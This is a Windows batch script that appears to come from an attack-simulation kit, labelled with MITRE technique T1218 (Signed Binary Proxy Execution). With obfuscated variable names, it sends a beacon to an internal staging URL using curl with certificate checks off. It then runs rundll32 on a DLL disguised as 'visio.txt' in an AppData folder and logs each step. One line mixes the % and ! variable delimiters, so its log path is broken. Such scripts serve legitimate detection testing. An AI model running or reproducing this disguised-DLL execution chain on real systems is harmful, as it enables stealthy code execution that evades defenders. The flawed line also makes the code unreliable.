@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET ksnmrf=%APPDATA%\9049\049617eb
SET kxmnbv=https://10.0.0.49
SET pqwrtc=https://10.0.0.49/stage/2/icon.png?9049-7
SET plmokn=BALAM-S2B
SET mnbvcx=7
SET zxcvbn=visio.txt
SET asdfgh=9049
SET ghjklq=%APPDATA%\!mnbvcx!
SET jhgfds=%ghjklq!\macula-simulations.log
SET lkjhgf=1
SET poiuyt=
SET dfghjk=T1218
SET hgfdsw=Signed_Binary_Proxy_Execution

echo [!DATE! !TIME!][DEBUG][!plmokn!]: heartbeat_start=>> "%jhgfds%" 2>nul
curl -k -s -o nul "!pqwrtc!"
echo [!DATE! !TIME!][DEBUG][!plmokn!]: heartbeat_complete=>> "%jhgfds%" 2>nul

echo [!DATE! !TIME!][DEBUG][!plmokn!]: chdir_start=!ksnmrf!>> "%jhgfds%" 2>nul
cd /d "!ksnmrf!" 2>nul
if errorlevel 1 (
    SET lkjhgf=0
    SET poiuyt=chdir_failed
    echo [!DATE! !TIME!][DEBUG][!plmokn!]: chdir_failed=!poiuyt!>> "%jhgfds%" 2>nul
)
echo [!DATE! !TIME!][DEBUG][!plmokn!]: chdir_complete=>> "%jhgfds%" 2>nul

echo [!DATE! !TIME!][DEBUG][!plmokn!]: dll_load_start=!zxcvbn!>> "%jhgfds%" 2>nul
rundll32.exe "!zxcvbn!", DllMain 2>nul
if errorlevel 1 (
    SET lkjhgf=0
    SET poiuyt=rundll32_failed
    echo [!DATE! !TIME!][DEBUG][!plmokn!]: dll_load_failed=!poiuyt!>> "%jhgfds%" 2>nul
) else (
    echo [!DATE! !TIME!][DEBUG][!plmokn!]: dll_load_complete=>> "%jhgfds%" 2>nul
)

echo [!DATE! !TIME!][!plmokn!]: !mnbvcx!-!asdfgh!-!dfghjk!|!hgfdsw!=!lkjhgf!:!poiuyt!>> "%jhgfds%" 2>nul
ENDLOCAL